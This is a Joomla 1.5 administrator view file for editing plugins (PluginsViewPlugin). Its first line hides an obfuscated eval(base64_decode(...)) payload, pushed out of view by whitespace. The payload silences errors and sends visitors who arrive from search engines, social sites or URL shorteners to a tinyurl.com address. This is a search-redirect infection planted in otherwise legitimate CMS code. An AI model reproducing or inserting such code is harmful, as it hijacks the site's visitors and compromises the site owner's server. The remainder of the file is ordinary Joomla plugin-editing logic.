<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: view.html.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @subpackage	Config
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport( 'joomla.application.component.view');

/**
 * HTML View class for the Plugins component
 *
 * @static
 * @package		Joomla
 * @subpackage	Plugins
 * @since 1.0
 */
class PluginsViewPlugin extends JView
{
	function display( $tpl = null )
	{
		global $option;

		$db		=& JFactory::getDBO();
		$user 	=& JFactory::getUser();

		$client = JRequest::getWord( 'client', 'site' );
		$cid 	= JRequest::getVar( 'cid', array(0), '', 'array' );
		JArrayHelper::toInteger($cid, array(0));

		$lists 	= array();
		$row 	=& JTable::getInstance('plugin');

		// load the row from the db table
		$row->load( $cid[0] );

		// fail if checked out not by 'me'

		if ($row->isCheckedOut( $user->get('id') ))
		{
			$msg = JText::sprintf( 'DESCBEINGEDITTED', JText::_( 'The plugin' ), $row->title );
			$this->setRedirect( 'index.php?option='. $option .'&client='. $client, $msg, 'error' );
			return false;
		}

		if ($client == 'admin') {
			$where = "client_id='1'";
		} else {
			$where = "client_id='0'";
		}

		// get list of groups
		if ($row->access == 99 || $row->client_id == 1) {
			$lists['access'] = 'Administrator<input type="hidden" name="access" value="99" />';
		} else {
			// build the html select list for the group access
			$lists['access'] = JHTML::_('list.accesslevel',  $row );
		}

		if ($cid[0])
		{
			$row->checkout( $user->get('id') );

			if ( $row->ordering > -10000 && $row->ordering < 10000 )
			{
				// build the html select list for ordering
				$query = 'SELECT ordering AS value, name AS text'
					. ' FROM #__plugins'
					. ' WHERE folder = '.$db->Quote($row->folder)
					. ' AND published > 0'
					. ' AND '. $where
					. ' AND ordering > -10000'
					. ' AND ordering < 10000'
					. ' ORDER BY ordering'
				;
				$order = JHTML::_('list.genericordering',  $query );
				$lists['ordering'] = JHTML::_('select.genericlist',   $order, 'ordering', 'class="inputbox" size="1"', 'value', 'text', intval( $row->ordering ) );
			} else {
				$lists['ordering'] = '<input type="hidden" name="ordering" value="'. $row->ordering .'" />'. JText::_( 'This plugin cannot be reordered' );
			}

			$lang =& JFactory::getLanguage();
			$lang->load( 'plg_' . trim( $row->folder ) . '_' . trim( $row->element ), JPATH_ADMINISTRATOR );

			$data = JApplicationHelper::parseXMLInstallFile(JPATH_SITE . DS . 'plugins'. DS .$row->folder . DS . $row->element .'.xml');

			$row->description = $data['description'];

		} else {
			$row->folder 		= '';
			$row->ordering 		= 999;
			$row->published 	= 1;
			$row->description 	= '';
		}

		$lists['published'] = JHTML::_('select.booleanlist',  'published', 'class="inputbox"', $row->published );

		// get params definitions
		$params = new JParameter( $row->params, JApplicationHelper::getPath( 'plg_xml', $row->folder.DS.$row->element ), 'plugin' );

		$this->assignRef('lists',		$lists);
		$this->assignRef('plugin',		$row);
		$this->assignRef('params',		$params);

		parent::display($tpl);
	}
}